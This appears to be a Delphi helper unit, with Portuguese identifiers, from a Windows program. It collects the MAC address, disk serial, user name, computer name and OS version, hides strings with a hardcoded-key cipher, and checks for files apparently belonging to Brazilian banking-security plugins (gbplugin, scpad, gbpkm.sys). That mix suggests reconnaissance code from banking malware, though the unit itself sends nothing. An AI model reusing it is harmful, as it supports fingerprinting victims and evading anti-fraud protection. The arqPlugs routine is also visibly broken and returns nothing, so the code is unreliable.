unit UFunc;

interface

uses
   Windows, SysUtils, Classes, Forms, Registry, NB30, httpsend, HTTPApp;

function Decrypt(const S: AnsiString): AnsiString;
function Encrypt(const S: AnsiString): AnsiString;
Function ListarArquivos(Diretorio: string; Sub:Boolean):String;
function TemAtributo(Attr, Val: Integer): Boolean;
function arqPlugs:String;
function GetMACAddress: string;
function GetAdapterInfo(Lana: Char): String;
function PCUser : string;
function HDSerial:String;
function SysVersion(var Ver: _OSVERSIONINFOA): boolean;
function VerWin: string;
function PCName: string;

implementation

uses UStr, UPrin, Math;


const
  key='ASLOWIU459S0SDFHLWERTERE';

function Crypt(Action, Src: string): string;
label Fim;
var KeyLen: Integer;
  KeyPos: Integer;
  OffSet: Integer;
  Dest: string;
  SrcPos: Integer;
  SrcAsc: Integer;
  TmpSrcAsc: Integer;
  Range: Integer;
begin
  if (Src = '') then
  begin
    Result := '';
    goto Fim;
  end;

  Dest := '';
  KeyLen := Length(Key);
  KeyPos := 0;
  SrcPos := 0;
  SrcAsc := 0;
  Range := 256;
  if (Action = 'C') then
  begin
    Randomize;
    OffSet := Random(Range);
    Dest := Format('%1.2x', [OffSet]);
    for SrcPos := 1 to Length(Src) do
    begin
      Application.ProcessMessages;
      SrcAsc := (Ord(Src[SrcPos]) + OffSet) mod 255;
      if KeyPos < KeyLen then KeyPos := KeyPos + 1 else KeyPos := 1;
      SrcAsc := SrcAsc xor Ord(Key[KeyPos]);
      Dest := Dest + Format('%1.2x', [SrcAsc]);
      OffSet := SrcAsc;
    end;
  end
  else if (Action = 'D') then
  begin
    OffSet := StrToInt('$' + copy(Src, 1, 2));
    SrcPos := 3;
    repeat
      SrcAsc := StrToInt('$' + copy(Src, SrcPos, 2));
      if (KeyPos < KeyLen) then KeyPos := KeyPos + 1 else KeyPos := 1;
      TmpSrcAsc := SrcAsc xor Ord(Key[KeyPos]);
      if TmpSrcAsc <= OffSet then TmpSrcAsc := 255 + TmpSrcAsc - OffSet
      else TmpSrcAsc := TmpSrcAsc - OffSet;
      Dest := Dest + Chr(TmpSrcAsc);
      OffSet := SrcAsc;
      SrcPos := SrcPos + 2;
    until (SrcPos >= Length(Src));
  end;
  Result := Dest;
  Fim:
end;

function Decrypt(const S: AnsiString): AnsiString;
begin
  Result := Crypt('D', S);
end;

function Encrypt(const S: AnsiString): AnsiString;
begin
  Result := Crypt('C', S);
end;

Function PSys32 : string;
var MeuBuffer: Array [1..128] of Char;
   retorno: Integer;
begin
  retorno := GetSystemDirectory(@MeuBuffer,128);
  if (retorno>128) OR (retorno=0) then
    PSys32 := ''
  else
    PSys32 := StrPas(@MeuBuffer);
end;

function PFiles : String;
var
  Reg: TRegistry;
begin
  Reg:=TRegistry.Create;

  Reg.RootKey := HKEY_LOCAL_MACHINE;
  if Reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion',False) = False then
     result := ''//Seta os valores padrão se não existir a chave . Muito improvável
  else
     begin
       try
       Result := IncludeTrailingPathDelimiter(Reg.ReadString('ProgramFilesDir'));
       except
       Result := ExtractFileDrive(GetCurrentDir)+'Arquivos de Programas';

       end;
     end;

  Reg.Free;
end;

function TemAtributo(Attr, Val: Integer): Boolean;
begin
  Result := Attr and Val = Val;

end;

Function ListarArquivos(Diretorio: string; Sub:Boolean):String;
var
  F: TSearchRec;
  i,Ret: Integer;
  TempNome, Arqs: string;
  S :TStringList;
begin
  s:=TStringList.Create;
  Ret := FindFirst(Diretorio+'\*.*', faAnyFile, F);
  try
    while Ret = 0 do
      begin
        if TemAtributo(F.Attr, faDirectory) then
          begin
            if (F.Name <> '.') And (F.Name <> '..') then
              if Sub = True then
                begin
                  TempNome := Diretorio+'\' + F.Name;
                  ListarArquivos(TempNome, True);
                end;
          end
        else
          begin
            s.Add(Diretorio+'\'+F.Name);
          end;
        //
        Ret := FindNext(F);
      end;
  finally
    begin
      FindClose(F);
    end;
  end;
  Arqs:='';
  for i:=0 to s.Count-1 do
  begin
     Arqs:=Arqs+ExtractFileName(s.Strings[i])+';';
  end;
  result:=Arqs;
end;

function arqPlugs: String;
var mask, r, res :String;
begin

  mask:=PFiles+'gbplugin\*.dll';
  r:='GB('+ListarArquivos(ExtractFilePath(mask), false)+')';
  if res<>'GB()' then
     r:=r;
  mask:=PFiles+'scpad\*.dll';
  r:='SCP('+ListarArquivos(ExtractFilePath(mask), false)+')';
  if r<>'SCP()' then
     res:=res+r;
  mask:=PSys32+'\drivers\gbpkm.sys';
  if FileExists(mask) then
     res:=res+'GBPKM(gbpkm.sys)';

end;

function GetMACAddress: string;
var
  AdapterList: TLanaEnum;
  NCB: TNCB;
begin
  FillChar(NCB, SizeOf(NCB), 0);
  NCB.ncb_command := Char(NCBENUM);
  NCB.ncb_buffer := @AdapterList;
  NCB.ncb_length := SizeOf(AdapterList);
  Netbios(@NCB);
  if Byte(AdapterList.length) > 0 then
    Result := GetAdapterInfo(AdapterList.lana[0])
  else
    Result := 'SEM MAC';
end;

function GetAdapterInfo(Lana: Char): String;
var
  Adapter: TAdapterStatus;
  NCB: TNCB;
begin
  FillChar(NCB, SizeOf(NCB), 0);
  NCB.ncb_command := Char(NCBRESET);
  NCB.ncb_lana_num := Lana;
  if Netbios(@NCB) <> Char(NRC_GOODRET) then
  begin
    Result := 'SEM MAC';
    Exit;
  end;

  FillChar(NCB, SizeOf(NCB), 0);
  NCB.ncb_command := Char(NCBASTAT);
  NCB.ncb_lana_num := Lana;
  NCB.ncb_callname := '*';
  FillChar(Adapter, SizeOf(Adapter), 0);
  NCB.ncb_buffer := @Adapter;
  NCB.ncb_length := SizeOf(Adapter);
  if Netbios(@NCB) <> Char(NRC_GOODRET) then
  begin
    Result := 'SEM MAC';
    Exit;
  end;
  Result := IntToHex(Byte(Adapter.adapter_address[0]), 2)+':'+
  IntToHex(Byte(Adapter.adapter_address[1]), 2)+':'+
  IntToHex(Byte(Adapter.adapter_address[2]), 2)+':'+
  IntToHex(Byte(Adapter.adapter_address[3]), 2)+':'+
  IntToHex(Byte(Adapter.adapter_address[4]), 2)+':'+
  IntToHex(Byte(Adapter.adapter_address[5]), 2);
end;

function PCUser : string;
var nsize: Cardinal;
    UserName: string;
begin
  nsize := 25;
  SetLength(UserName,nsize);
  if GetUserName(PChar(UserName), nsize) then
  begin
    SetLength(UserName,nsize-1);
    Result := UserName;
  end;
end;

function HDSerial:String;
Var
   Serial:DWord;
   DirLen,Flags: DWord;
   DLabel : Array[0..11] of Char;
begin
  Try
    GetVolumeInformation('c:\',dLabel,12,@Serial,DirLen,Flags,nil,0);
    Result := IntToHex(Serial,8);
  Except
    Result :='';
  end;
end;
function SysVersion(var Ver: _OSVERSIONINFOA): boolean;
begin
  Ver.dwOSVersionInfoSize := SizeOf(Ver);
  Result := GetVersionEx(Ver);
end;

function VerWin: string;
var
  VersionInfo: TOSVersionInfo;
  Ver, Build, ServicePack: string;

begin
  VersionInfo.dwOSVersionInfoSize := SizeOf(VersionInfo);
  GetVersionEx(VersionInfo);
  Result := '';

  with VersionInfo do
  begin
    ServicePack := szCSDVersion;
    Build := IntToStr(dwBuildNumber);

    Ver := '(versão' + FormatFloat('0', dwMajorVersion) + '.' +
      FormatFloat('00', dwMinorVersion) + ' ' + Build + ' ' + ServicePack + ')';

    case dwPlatformId of
      1:
        case dwMinorVersion of
          0: Result := 'Windows 95' + ver; //
          10: Result := 'Windows 98(SE)' + ver; //
          90: Result := 'Windows Me' + ver; //
        end;
      2:
        case dwMajorVersion of
          3: Result := 'Windows NT 3.51' + ver; //
          4: Result := 'Windows NT 4.0' + ver; //
          5:
            case dwMinorVersion of
              0: Result := 'Windows 2000' + ver; //
              1: Result := 'Windows XP' + ver; //
              2: Result := 'Windows Server 2003' + ver; //
            end;
          6:
            case dwMinorVersion of
              0: Result := 'Windows Vista' + ver; //
              1: Result := 'Windows 7' + ver; //
            end;
        end;
    end;
  end;
  if (Result = '') then
    Result := 'Sistema operacional desconhecido.'; //
end;

function PCName: string;
var
  I: DWord;
begin
  I := MAX_COMPUTERNAME_LENGTH + 1;
  SetLength(Result, I);
  Windows.GetComputerName(PChar(Result), I);
  Result := string(PChar(Result));
end;


end.
